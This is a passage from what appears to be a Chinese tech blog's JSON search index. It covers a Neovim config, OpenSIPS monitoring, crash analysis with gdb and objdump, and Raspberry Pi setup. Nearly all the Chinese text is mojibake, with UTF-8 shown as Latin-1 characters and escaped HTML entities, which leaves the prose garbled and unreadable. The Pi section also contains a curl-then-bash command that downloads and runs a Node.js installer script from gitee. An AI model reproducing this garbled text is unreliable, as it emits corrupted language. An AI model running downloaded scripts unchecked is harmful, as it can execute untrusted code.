\u0026#39;preservim/tagbar\u0026#39;, { \u0026#39;for\u0026#39;: [\u0026#39;go\u0026#39;, \u0026#39;c\u0026#39;]} \u0026#34;Plug \u0026#39;airblade/vim-gitgutter\u0026#39; \u0026#34;Plug \u0026#39;fatih/vim-go\u0026#39;, { \u0026#39;do\u0026#39;: \u0026#39;:GoUpdateBinaries\u0026#39;, \u0026#39;for\u0026#39;: \u0026#39;go\u0026#39; } \u0026#34;Plug \u0026#39;dense-analysis/ale\u0026#39; \u0026#34;Plug \u0026#39;vim-scripts/matchit.zip\u0026#39; \u0026#34;Plug \u0026#39;pangloss/vim-javascript\u0026#39;, {\u0026#39;for\u0026#39;:\u0026#39;javascript\u0026#39;} \u0026#34;Plug \u0026#39;leafgarland/typescript-vim\u0026#39; \u0026#34;Plug \u0026#39;neoclide/coc.nvim\u0026#39;, {\u0026#39;branch\u0026#39;: \u0026#39;release\u0026#39;} \u0026#34;Plug \u0026#39;jremmen/vim-ripgrep\u0026#39; \u0026#34;Plug \u0026#39;plasticboy/vim-markdown\u0026#39; \u0026#34;Plug \u0026#39;mzlogin/vim-markdown-toc\u0026#39; call plug#end() filetype plugin indent on filetype plugin on filetype indent on set guicursor= set history=1000 let g:netrw_banner=0 let g:ale_linters = { \\ \u0026#39;javascript\u0026#39;: [\u0026#39;standard\u0026#39;], \\ \u0026#39;typescript\u0026#39;: [\u0026#39;tsserver\u0026#39;] \\} let g:ale_fixers = {\u0026#39;javascript\u0026#39;: [\u0026#39;standard\u0026#39;]} let g:ale_lint_on_save = 1 let g:ale_fix_on_save = 1 let g:ale_typescript_tsserver_executable=\u0026#39;tsserver\u0026#39; let g:airline#extensions#tabline#enabled = 1 let g:ale_set_loclist = 0 let g:ale_set_quickfix = 1 let g:ale_open_list = 0 let g:vim_markdown_folding_disabled = 1 let g:vmt_cycle_list_item_markers = 1 let g:tagbar_sort = 0 \u0026#34; colorscheme codedark \u0026#34; let g:airline_theme = \u0026#39;codedark\u0026#39; \u0026#34; \u0026#34; buffer let mapleader = \u0026#34;,\u0026#34; nnoremap \u0026lt;Leader\u0026gt;j :bp\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;k :bn\u0026lt;CR\u0026gt; \u0026#34; next buffer nnoremap \u0026lt;Leader\u0026gt;n :bf\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;m :bl\u0026lt;CR\u0026gt; \u0026#34; next buffer nnoremap \u0026lt;Leader\u0026gt;l :b#\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;e :e\u0026lt;CR\u0026gt; \u0026#34; open netrw nnoremap \u0026lt;Leader\u0026gt;d :bd\u0026lt;CR\u0026gt; \u0026#34; close buffer nnoremap \u0026lt;Leader\u0026gt;g :!","title":"ä½¿ç”¨æ ‘è“æ´¾3b+ä½œä¸ºè¾…åŠ©å¼€å‘ä½“éªŒ"},{"content":"æ—¥å¿—ç›‘æ§ åŠ¡å¿…ç›‘æ§opensipsæ—¥å¿—ï¼Œå¦‚æœå…¶ä¸­å‡ºç°äº†CRITICALå…³é”®å­—, å¾ˆå¯èƒ½é©¬ä¸Šopensipså°±è¦å´©æºƒã€‚\nç¬¬ä¸€è¦å‘å‡ºå‘Šè­¦ä¿¡æ¯ã€‚ç¬¬äºŒè¦æœ‰ä¸»åŠ¨çš„è‡ªåŠ¨é‡å¯ç­–ç•¥ï¼Œä¾‹å¦‚ä½¿ç”¨systemdå¯åŠ¨çš„è¯ï¼ŒæœåŠ¡å´©æºƒä¼šä¼šç«‹é©¬è¢«é‡å¯ã€‚æˆ–è€…ç”¨dockeræˆ–è€…k8sï¼Œè¿™äº›è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¯ä»¥è®©å®¹å™¨å´©æºƒåè‡ªåŠ¨é‡å¯ã€‚\næŒ‡æ ‡ç›‘æ§ opensipsæœ‰å†…éƒ¨çš„ç»Ÿè®¡æ¨¡å—ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„é€šè¿‡opensipsctlæˆ–è€…ç›¸å…³çš„httpçš„miæ¥å£è·å–åˆ°å†…éƒ¨çš„ç»Ÿè®¡æ•°æ®ã€‚\nä»¥ä¸‹ç»™å‡ºå‡ ä¸ªå…³é”®çš„ç»Ÿè®¡æŒ‡æ ‡ï¼š\n\u0026rsquo;total_size\u0026rsquo;, å…¨éƒ¨å†…å­˜ \u0026lsquo;used_size\u0026rsquo;, ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;real_used_size\u0026rsquo;, çœŸæ˜¯ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;max_used_size\u0026rsquo;, æœ€å¤§ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;free_size\u0026rsquo;, ç©ºé—²å†…å­˜ \u0026lsquo;fragments\u0026rsquo;, \u0026lsquo;active_dialogs\u0026rsquo;, æ¥é€šçŠ¶æ€çš„é€šè¯ \u0026rsquo;early_dialogs\u0026rsquo;, æŒ¯é“ƒçŠ¶æ€çš„é€šè¯ \u0026lsquo;inuse_transactions\u0026rsquo;, æ­£åœ¨ä½¿ç”¨çš„äº‹åŠ¡ \u0026lsquo;waiting_udp\u0026rsquo;, å †ç§¯çš„udpæ¶ˆæ¯ \u0026lsquo;waiting_tcp\u0026rsquo; å †ç§¯çš„tcpæ¶ˆæ¯ å½“ç„¶è¿˜æœ‰å¾ˆå¤šçš„ä¸€äº›æŒ‡æ ‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼šopensipsctl fifo get_statistics allæ¥è·å–ã€‚\n","permalink":"https://wdd.js.org/opensips/ch3/prd-warning/","summary":"æ—¥å¿—ç›‘æ§ åŠ¡å¿…ç›‘æ§opensipsæ—¥å¿—ï¼Œå¦‚æœå…¶ä¸­å‡ºç°äº†CRITICALå…³é”®å­—, å¾ˆå¯èƒ½é©¬ä¸Šopensipså°±è¦å´©æºƒã€‚\nç¬¬ä¸€è¦å‘å‡ºå‘Šè­¦ä¿¡æ¯ã€‚ç¬¬äºŒè¦æœ‰ä¸»åŠ¨çš„è‡ªåŠ¨é‡å¯ç­–ç•¥ï¼Œä¾‹å¦‚ä½¿ç”¨systemdå¯åŠ¨çš„è¯ï¼ŒæœåŠ¡å´©æºƒä¼šä¼šç«‹é©¬è¢«é‡å¯ã€‚æˆ–è€…ç”¨dockeræˆ–è€…k8sï¼Œè¿™äº›è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¯ä»¥è®©å®¹å™¨å´©æºƒåè‡ªåŠ¨é‡å¯ã€‚\næŒ‡æ ‡ç›‘æ§ opensipsæœ‰å†…éƒ¨çš„ç»Ÿè®¡æ¨¡å—ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„é€šè¿‡opensipsctlæˆ–è€…ç›¸å…³çš„httpçš„miæ¥å£è·å–åˆ°å†…éƒ¨çš„ç»Ÿè®¡æ•°æ®ã€‚\nä»¥ä¸‹ç»™å‡ºå‡ ä¸ªå…³é”®çš„ç»Ÿè®¡æŒ‡æ ‡ï¼š\n\u0026rsquo;total_size\u0026rsquo;, å…¨éƒ¨å†…å­˜ \u0026lsquo;used_size\u0026rsquo;, ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;real_used_size\u0026rsquo;, çœŸæ˜¯ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;max_used_size\u0026rsquo;, æœ€å¤§ä½¿ç”¨çš„å†…å­˜ \u0026lsquo;free_size\u0026rsquo;, ç©ºé—²å†…å­˜ \u0026lsquo;fragments\u0026rsquo;, \u0026lsquo;active_dialogs\u0026rsquo;, æ¥é€šçŠ¶æ€çš„é€šè¯ \u0026rsquo;early_dialogs\u0026rsquo;, æŒ¯é“ƒçŠ¶æ€çš„é€šè¯ \u0026lsquo;inuse_transactions\u0026rsquo;, æ­£åœ¨ä½¿ç”¨çš„äº‹åŠ¡ \u0026lsquo;waiting_udp\u0026rsquo;, å †ç§¯çš„udpæ¶ˆæ¯ \u0026lsquo;waiting_tcp\u0026rsquo; å †ç§¯çš„tcpæ¶ˆæ¯ å½“ç„¶è¿˜æœ‰å¾ˆå¤šçš„ä¸€äº›æŒ‡æ ‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼šopensipsctl fifo get_statistics allæ¥è·å–ã€‚","title":"ç”Ÿäº§ç¯å¢ƒç›‘æ§å‘Šè­¦"},{"content":"core dumpæ–‡ä»¶åœ¨å“ªé‡Œï¼Ÿ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œopensipsåœ¨å´©æºƒçš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿcore dumpæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä½äºè·Ÿç›®å½•ä¸‹ï¼Œåå­—å¦‚core.xxxxç­‰çš„ã€‚\ncore dumpæ–‡ä»¶ä¸€èˆ¬å¤§çº¦æœ‰1Gå·¦å³ï¼Œæ‰€ä»¥å½“äº§ç”Ÿcore dumpçš„æ—¶å€™ï¼Œè¦ä¿è¯ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´æ˜¯å¦è¶³å¤Ÿã€‚\nå¦‚ä½•å¼€å¯core dumpï¼Ÿ ç¬¬ä¸€ï¼Œopensipsè„šæœ¬ä¸­æœ‰ä¸ªå‚æ•°å«åšdisable_core_dumpï¼Œ è¿™ä¸ªå‚æ•°é»˜è®¤ä¸ºno, ä¹Ÿå°±æ˜¯å¯ç”¨core dump, å¯ä»¥å°†è¿™ä¸ªå‚æ•°è®¾ç½®ä¸ºno, æ¥ç¦ç”¨core dumpã€‚ä½†æ˜¯ç”Ÿäº§ç¯å¢ƒä¸€èˆ¬å»ºè®®è¿˜æ˜¯å¼€å¯core dump, å¦åˆ™æœåŠ¡å´©æºƒäº†ï¼Œå°±åªèƒ½çœ‹æ—¥å¿—ï¼Œæ— æ³•å®šä½åˆ°å…·ä½“çš„å´©æºƒä»£ç çš„ä½ç½®ã€‚\ndisable_core_dump=yes ç¬¬äºŒï¼Œè¿˜éœ€è¦åœ¨opensipså¯åŠ¨ä¹‹å‰ï¼Œè¿è¡Œï¼šulimit -c unlimited, è¿™ä¸ªå‘½ä»¤ä¼šè®©opensips core dumpçš„æ—¶å€™ï¼Œä¸ä¼šé™åˆ¶core dumpæ–‡ä»¶çš„å¤§å°ã€‚ä¸€èˆ¬æ¥è¯´core dumpæ–‡ä»¶çš„å¤§å°æ˜¯å…±äº«å†…å­˜ + ç§æœ‰å†…å­˜ã€‚\nç¬¬ä¸‰ï¼Œopensipsè¿›ç¨‹çš„ç”¨æˆ·å¦‚æœä¸æ˜¯root, é‚£ä¹ˆå¯èƒ½æ²¡æœ‰æƒé™å°†core dumpæ–‡ä»¶å†™åˆ°/ç›®å½•ä¸‹ã€‚æœ‰ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œ\nç”¨rootç”¨æˆ·å¯åŠ¨opensipsè¿›ç¨‹ ä½¿ç”¨-w å‚æ•°é…ç½®opensipsçš„å·¥ä½œç›®å½•ï¼Œcore dumpæ–‡ä»¶å°†ä¼šå†™åˆ°å¯¹åº”çš„ç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼šopensips -w /var/log å¦‚æœcore dumpå¤±è´¥æ˜¯å› ä¸ºæƒé™çš„é—®é¢˜ï¼Œ opensipsçš„æ—¥å¿—æ–‡ä»¶ä¸­å°†ä¼šæ‰“å°ï¼š\nCan\u0026#39;t open \u0026#39;core.xxxx\u0026#39; at \u0026#39;/\u0026#39;: Permission denied å¦‚ä½•åˆ†æcore dumpæ–‡ä»¶ï¼Ÿ ä½¿ç”¨gdb\ngdb $(which opensips) core.12333 # è¿›å…¥gdbè°ƒè¯•ä¹‹å, è¾“å…¥bt full, ä¼šæ‰“å°è¯¦ç»†çš„é”™è¯¯æ ˆä¿¡æ¯ bt full æ²¡æœ‰äº§ç”Ÿcore dumpæ–‡ä»¶ï¼Œå¦‚ä½•åˆ†æå´©æºƒåŸå› ï¼Ÿ ä½¿ç”¨objdumpã€‚\nä¸€èˆ¬æ¥è¯´opensipså´©æºƒåï¼Œæ—¥å¿—æ–‡ä»¶ä¸­ä¸€èˆ¬ä¼šå‡ºç°ä¸‹é¢çš„ä¿¡æ¯\nkernel: opensips[8954]: segfault at 1ea72b5 ip 00000000004be532 sp 00007ffe9e1e6df0 error 4 in opensips[400000+203000] æˆ‘ä»¬ä»ä¸­å–å‡ºå‡ ä¸ªå…³é”®è¯\nat 1ea72b5 å°è¯•è®¿é—®çš„å†…å­˜åœ°å€åç§» error 4 é”™è¯¯çš„ç±»å‹ fault was an instruction fetch ip 00000000004be532 æŒ‡ä»¤æŒ‡é’ˆçš„ä½ç½®ï¼Œ æ³¨æ„è¿™ä¸ª4be532 sp 00007ffe9e1e6df0 æ ˆæŒ‡é’ˆçš„ä½ç½® 400000+203000 x86æ¶æ„ /* * Page fault error code bits * bit 0 == 0 means no page found, 1 means protection fault * bit 1 == 0 means read, 1 means write * bit 2 == 0 means kernel, 1 means user-mode * bit 3 == 1 means use of reserved bit detected * bit 4 == 1 means fault was an instruction fetch */ #define PF_PROT (1\u0026lt;\u0026lt;0) #define PF_WRITE (1\u0026lt;\u0026lt;1) #define PF_USER (1\u0026lt;\u0026lt;2) #define PF_RSVD (1\u0026lt;\u0026lt;3) #define PF_INSTR (1\u0026lt;\u0026lt;4) ä½¿ç”¨objdump, å¯ä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåæ±‡ç¼–æ‰¾åˆ°å¯¹åº”ä»£ç çš„ä½ç½®ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥åœ¨åæ±‡ç¼–çš„è¾“å‡ºä¸­æœç´¢4be532ï¼Œå°±å¯ä»¥æ‰¾åˆ°å¯¹åº”ä»£ç çš„ä½ç½®ã€‚\nobjdump -j .text -ld -C -S $(which opensips) \u0026gt; op.txt ç„¶åæˆ‘ä»¬åœ¨op.txtä¸­æœç´¢4be523, å°±èƒ½æ‰¾åˆ°å¯¹é¥®çš„æºç æˆ–è€…å‡½æ•°çš„ä½ç½®ã€‚ç„¶åæ ¹æ®æºç åˆ†æé—®é¢˜ã€‚\nå‚è€ƒ https://www.opensips.org/Documentation/TroubleShooting-Crash https://stackoverflow.com/questions/2549214/interpreting-segfault-messages https://stackoverflow.com/questions/2179403/how-do-you-read-a-segfault-kernel-log-message/2179464#2179464 https://rgeissert.blogspot.com/p/segmentation-fault-error.html ","permalink":"https://wdd.js.org/opensips/ch7/crash/","summary":"core dumpæ–‡ä»¶åœ¨å“ªé‡Œï¼Ÿ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œopensipsåœ¨å´©æºƒçš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿcore dumpæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä½äºè·Ÿç›®å½•ä¸‹ï¼Œåå­—å¦‚core.xxxxç­‰çš„ã€‚\ncore dumpæ–‡ä»¶ä¸€èˆ¬å¤§çº¦æœ‰1Gå·¦å³ï¼Œæ‰€ä»¥å½“äº§ç”Ÿcore dumpçš„æ—¶å€™ï¼Œè¦ä¿è¯ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´æ˜¯å¦è¶³å¤Ÿã€‚\nå¦‚ä½•å¼€å¯core dumpï¼Ÿ ç¬¬ä¸€ï¼Œopensipsè„šæœ¬ä¸­æœ‰ä¸ªå‚æ•°å«åšdisable_core_dumpï¼Œ è¿™ä¸ªå‚æ•°é»˜è®¤ä¸ºno, ä¹Ÿå°±æ˜¯å¯ç”¨core dump, å¯ä»¥å°†è¿™ä¸ªå‚æ•°è®¾ç½®ä¸ºno, æ¥ç¦ç”¨core dumpã€‚ä½†æ˜¯ç”Ÿäº§ç¯å¢ƒä¸€èˆ¬å»ºè®®è¿˜æ˜¯å¼€å¯core dump, å¦åˆ™æœåŠ¡å´©æºƒäº†ï¼Œå°±åªèƒ½çœ‹æ—¥å¿—ï¼Œæ— æ³•å®šä½åˆ°å…·ä½“çš„å´©æºƒä»£ç çš„ä½ç½®ã€‚\ndisable_core_dump=yes ç¬¬äºŒï¼Œè¿˜éœ€è¦åœ¨opensipså¯åŠ¨ä¹‹å‰ï¼Œè¿è¡Œï¼šulimit -c unlimited, è¿™ä¸ªå‘½ä»¤ä¼šè®©opensips core dumpçš„æ—¶å€™ï¼Œä¸ä¼šé™åˆ¶core dumpæ–‡ä»¶çš„å¤§å°ã€‚ä¸€èˆ¬æ¥è¯´core dumpæ–‡ä»¶çš„å¤§å°æ˜¯å…±äº«å†…å­˜ + ç§æœ‰å†…å­˜ã€‚\nç¬¬ä¸‰ï¼Œopensipsè¿›ç¨‹çš„ç”¨æˆ·å¦‚æœä¸æ˜¯root, é‚£ä¹ˆå¯èƒ½æ²¡æœ‰æƒé™å°†core dumpæ–‡ä»¶å†™åˆ°/ç›®å½•ä¸‹ã€‚æœ‰ä¸¤ä¸ªè§£å†³åŠæ³•ï¼Œ\nç”¨rootç”¨æˆ·å¯åŠ¨opensipsè¿›ç¨‹ ä½¿ç”¨-w å‚æ•°é…ç½®opensipsçš„å·¥ä½œç›®å½•ï¼Œcore dumpæ–‡ä»¶å°†ä¼šå†™åˆ°å¯¹åº”çš„ç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼šopensips -w /var/log å¦‚æœcore dumpå¤±è´¥æ˜¯å› ä¸ºæƒé™çš„é—®é¢˜ï¼Œ opensipsçš„æ—¥å¿—æ–‡ä»¶ä¸­å°†ä¼šæ‰“å°ï¼š\nCan\u0026#39;t open \u0026#39;core.xxxx\u0026#39; at \u0026#39;/\u0026#39;: Permission denied å¦‚ä½•åˆ†æcore dumpæ–‡ä»¶ï¼Ÿ ä½¿ç”¨gdb\ngdb $(which opensips) core.12333 # è¿›å…¥gdbè°ƒè¯•ä¹‹å, è¾“å…¥bt full, ä¼šæ‰“å°è¯¦ç»†çš„é”™è¯¯æ ˆä¿¡æ¯ bt full æ²¡æœ‰äº§ç”Ÿcore dumpæ–‡ä»¶ï¼Œå¦‚ä½•åˆ†æå´©æºƒåŸå› ï¼Ÿ ä½¿ç”¨objdumpã€‚\nä¸€èˆ¬æ¥è¯´opensipså´©æºƒåï¼Œæ—¥å¿—æ–‡ä»¶ä¸­ä¸€èˆ¬ä¼šå‡ºç°ä¸‹é¢çš„ä¿¡æ¯\nkernel: opensips[8954]: segfault at 1ea72b5 ip 00000000004be532 sp 00007ffe9e1e6df0 error 4 in opensips[400000+203000] æˆ‘ä»¬ä»ä¸­å–å‡ºå‡ ä¸ªå…³é”®è¯","title":"opensipså´©æºƒåˆ†æ"},{"content":"æ’æŸ¥æ—¥å¿— opensipsçš„log_stderrorå‚æ•°å†³å®šå†™æ—¥å¿—çš„ä½ç½®ï¼Œ\nyes å†™æ—¥å¿—åˆ°æ ‡å‡†é”™è¯¯ no å†™æ—¥å¿—åˆ°syslogæœåŠ¡(é»˜è®¤) å¦‚æœä½¿ç”¨é»˜è®¤çš„syslogæœåŠ¡ï¼Œé‚£ä¹ˆæ—¥å¿—å°†ä¼šå¯èƒ½å†™åˆ°ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚\n/var/log/messages /var/log/syslog ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåˆ†æ/var/log/messagesæ—¥å¿—ï¼Œå¯ä»¥å®šä½åˆ°æ— æ³•å¯åŠ¨çš„åŸå› ã€‚\nå¦‚æœæ—¥å¿—æ–‡ä»¶ä¸­æ— æ³•å®šä½åˆ°å…·ä½“åŸå› ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†log_stderrorè®¾ç½®ä¸ºyesã€‚\næ³¨æ„ï¼šå¾€æ ‡å‡†é”™è¯¯ä¸­æ‰“å°çš„æ—¥å¿—ï¼Œå¾€å¾€æ¯”ç½‘æ—¥å¿—æ–‡ä»¶ä¸­æ‰“å°çš„æ›´è¯¦ç»†ã€‚è€Œä¸”æœ‰äº›æ—¶å€™ï¼Œæˆ‘å‘ç°è¿™ä¸ªé”™è¯¯åœ¨æ ‡å‡†é”™è¯¯ä¸­æ‰“å°äº†ï¼Œä½†æ˜¯å´ä¸ä¼šè¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚\næ‰€ä»¥ï¼Œçœ‹æ ‡å‡†é”™è¯¯çš„æ—¥å¿—ï¼Œå¾€å¾€æ›´å®¹æ˜“å®šä½åˆ°é—®é¢˜ã€‚\n","permalink":"https://wdd.js.org/opensips/ch7/can-not-run/","summary":"æ’æŸ¥æ—¥å¿— opensipsçš„log_stderrorå‚æ•°å†³å®šå†™æ—¥å¿—çš„ä½ç½®ï¼Œ\nyes å†™æ—¥å¿—åˆ°æ ‡å‡†é”™è¯¯ no å†™æ—¥å¿—åˆ°syslogæœåŠ¡(é»˜è®¤) å¦‚æœä½¿ç”¨é»˜è®¤çš„syslogæœåŠ¡ï¼Œé‚£ä¹ˆæ—¥å¿—å°†ä¼šå¯èƒ½å†™åˆ°ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚\n/var/log/messages /var/log/syslog ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåˆ†æ/var/log/messagesæ—¥å¿—ï¼Œå¯ä»¥å®šä½åˆ°æ— æ³•å¯åŠ¨çš„åŸå› ã€‚\nå¦‚æœæ—¥å¿—æ–‡ä»¶ä¸­æ— æ³•å®šä½åˆ°å…·ä½“åŸå› ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†log_stderrorè®¾ç½®ä¸ºyesã€‚\næ³¨æ„ï¼šå¾€æ ‡å‡†é”™è¯¯ä¸­æ‰“å°çš„æ—¥å¿—ï¼Œå¾€å¾€æ¯”ç½‘æ—¥å¿—æ–‡ä»¶ä¸­æ‰“å°çš„æ›´è¯¦ç»†ã€‚è€Œä¸”æœ‰äº›æ—¶å€™ï¼Œæˆ‘å‘ç°è¿™ä¸ªé”™è¯¯åœ¨æ ‡å‡†é”™è¯¯ä¸­æ‰“å°äº†ï¼Œä½†æ˜¯å´ä¸ä¼šè¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚\næ‰€ä»¥ï¼Œçœ‹æ ‡å‡†é”™è¯¯çš„æ—¥å¿—ï¼Œå¾€å¾€æ›´å®¹æ˜“å®šä½åˆ°é—®é¢˜ã€‚","title":"opensipsæ— æ³•å¯åŠ¨"},{"content":"é€‰æ‹©é‚£ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿï¼Ÿ ä¸è¦è¿‡é«˜çš„ä¼°ç®—æ ‘è“æ´¾çš„æ€§èƒ½ï¼Œæœ€å¥½ä¸è¦é€‰æ‹©é‚£äº›å…·æœ‰æ¼‚äº®ç•Œé¢çš„ubuntuæˆ–è€…manjaro, å› ä¸ºå½“ä½ ä½¿ç”¨è¿™äº›å¸¦æ¡Œé¢çš„ç³»ç»Ÿæ—¶ï¼Œå¾ˆå¤§æ¦‚ç‡ç•Œé¢èƒ½è®©ä½ å¡çš„æƒ³æŠŠæ ‘è“æ´¾ç ¸äº†ã€‚\næ‰€ä»¥ä¼˜å…ˆé€‰æ‹©ä¸å¸¦å›¾å½¢ç•Œé¢çš„liteç‰ˆæœ¬çš„ç³»ç»Ÿï¼Œå¦‚æœç¡®å®éœ€è¦çš„è¯ï¼Œå¯ä»¥å†å®‰è£…lxde\nç½‘çº¿æ’äº†ï¼Œè¿˜æ˜¯æ— æ³•è”ç½‘ æ’äº†ç½‘çº¿ï¼Œç½‘å£ä¸Šçš„ç»¿ç¯ä¹Ÿæ˜¯åœ¨é—ªçƒï¼Œä½†æ˜¯eth0å°±æ˜¯æ— æ³•è”ç½‘æˆåŠŸã€‚çœŸæ˜¯æ°”äººã€‚\nè§£å†³æ–¹æ¡ˆï¼š ç¼–è¾‘ /etc/network/interfaces, å°†é‡Œé¢çš„å†…å®¹æ”¹å†™æˆä¸‹é¢çš„ï¼Œç„¶åé‡å¯æ ‘è“æ´¾ã€‚\nè¿™ä¸ªé…ç½®æ–‡ä»¶çš„æ¶µä¹‰æ˜¯ï¼šåœ¨å¯åŠ¨æ—¶å°±ä½¿ç”¨eth0æœ‰çº¿ç½‘å¡ï¼Œå¹¶ä¸”ä½¿ç”¨dhcpç»™è¿™ä¸ªç½‘å¡è‡ªåŠ¨é…ç½®IP\nauto eth0 iface eth0 inet dhcp iface etho inet6 dhcp source-directory /etc/network/interfaces.d æ— æ¡Œé¢ç‰ˆæœ¬ï¼Œå¦‚ä½•æ‰‹å·¥å®‰è£…æ¡Œé¢ é¦–å…ˆå®‰è£…lxde\nsudo apt update sudo apt install lxde -y ç„¶åé€šè¿‡raspi-config, é…ç½®é»˜è®¤ä»æ¡Œé¢å¯åŠ¨\nsudo rasip-config é€‰æ‹©ç³»ç»Ÿé…ç½®, æŒ‰å›è½¦é”®è¿›å…¥ é€‰æ‹©Boot/Auto loginï¼Œ æŒ‰å›è½¦è¿›å…¥\né€‰æ‹©Desktop, å›è½¦ç¡®è®¤ã€‚ä¿å­˜ä¹‹åï¼Œé€€å‡ºé‡å¯ã€‚\né”®ç›˜æ— æ³•è¾“å…¥| | åœ¨linuxä¸­æ˜¯ç®¡é“çš„æ„æ€ï¼Œç„¶è€Œæˆ‘çš„é”®ç›˜å´æ— æ³•è¾“å…¥ã€‚æœ€ç»ˆå‘ç°æ˜¯é”®ç›˜å¸ƒå±€çš„åŸå› ã€‚\nåœ¨å›¾æ ‡ä¸Šå³é”®ï¼Œé€‰æ‹©é…ç½®\næ³¨æ„è¿™é‡Œæ˜¯US, è¿™æ˜¯æ­£å¸¸çš„ã€‚å¦‚æœæ˜¯UKï¼Œå°±æ˜¯è‹±å¼å¸ƒå±€ï¼Œæ˜¯æœ‰é—®é¢˜çš„ï¼Œéœ€è¦æŠŠUKçš„åˆ é™¤ï¼Œé‡æ–°å¢åŠ ä¸€ä¸ªUSçš„ã€‚\nå¦‚ä½•å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„neovim? æ ‘è“æ´¾ä½¿ç”¨aptå®‰è£…çš„neovimï¼Œ ç‰ˆæœ¬å¤ªè€äº†ã€‚å¾ˆå¤šæ’ä»¶ä½¿ç”¨ä¸Šéƒ½ä¼šä½“éªŒä¸å¥½ã€‚æ‰€ä»¥å»ºè®®å®‰è£…æœ€æ–°ç‰ˆçš„neovimã€‚\nsudo apt install snapd sudo snap install --classic nvim æ³¨æ„ï¼š nvimçš„é»˜è®¤å®‰è£…çš„è·¯å¾„æ˜¯/snap/bin, æ‰€ä»¥ä½ éœ€è¦æŠŠè¿™ä¸ªè·¯å¾„è®¾ç½®åˆ°PATHé‡Œï¼Œæ‰èƒ½ä½¿ç”¨nvim. å¦‚ä½•å®‰è£…æœ€æ–°çš„golangï¼Ÿ æ‰“å¼€è¿™ä¸ªé¡µé¢ https://golang.google.cn/dl/\nå› ä¸ºæ ‘è“æ˜¯armhfæ¶æ„çš„ï¼Œæ‰€ä»¥è¿™è¿™ä¹ˆå¤šç‰ˆæœ¬é‡Œï¼Œåªæœ‰armv6lè¿™ä¸ªç‰ˆæœ¬æ˜¯èƒ½å¤Ÿåœ¨æ ‘è“æ´¾ä¸Šè¿è¡Œçš„ã€‚\nå‹ç¼©åŒ…ä¸‹è½½ä¹‹åè§£å‹ï¼Œé‡Œé¢çš„go/binç›®å½•ä¸­å°±æœ‰goçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªè¦å°†è¿™ä¸ªç›®å½•æš´éœ²åˆ°PTAHä¸­ï¼Œå°±èƒ½ä½¿ç”¨golangäº†ã€‚\nå¦‚ä½•å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„node.js curl -L https://gitee.com/wangduanduan/install-node/raw/master/bin/n -o n bash n lts å¦‚ä½•å®‰è£…è°·æ­Œæµè§ˆå™¨ï¼Ÿ sudo apt full-upgrade sudo apt install chromium-browser -y ä½¿ç”¨æ¸…åaptæº https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/ # ç¼–è¾‘ `/etc/apt/sources.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main non-free contrib rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main non-free contrib rpi # ç¼–è¾‘ `/etc/apt/sources.list.d/raspi.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui å¦‚ä½•å®‰è£…æˆªå›¾å·¥å…·ï¼Ÿ sudo apt-get install -y flameshot ä½¿ç”¨æ ‘è“æ´¾åœ¨æµè§ˆå™¨ä¸Šçœ‹è§†é¢‘æ€ä¹ˆæ ·ï¼Ÿ éå¸¸å¡\n","permalink":"https://wdd.js.org/posts/2021/08/uuvor0/","summary":"é€‰æ‹©é‚£ä¸ªç‰ˆæœ¬çš„ç³»ç»Ÿï¼Ÿ ä¸è¦è¿‡é«˜çš„ä¼°ç®—æ ‘è“æ´¾çš„æ€§èƒ½ï¼Œæœ€å¥½ä¸è¦é€‰æ‹©é‚£äº›å…·æœ‰æ¼‚äº®ç•Œé¢çš„ubuntuæˆ–è€…manjaro, å› ä¸ºå½“ä½ 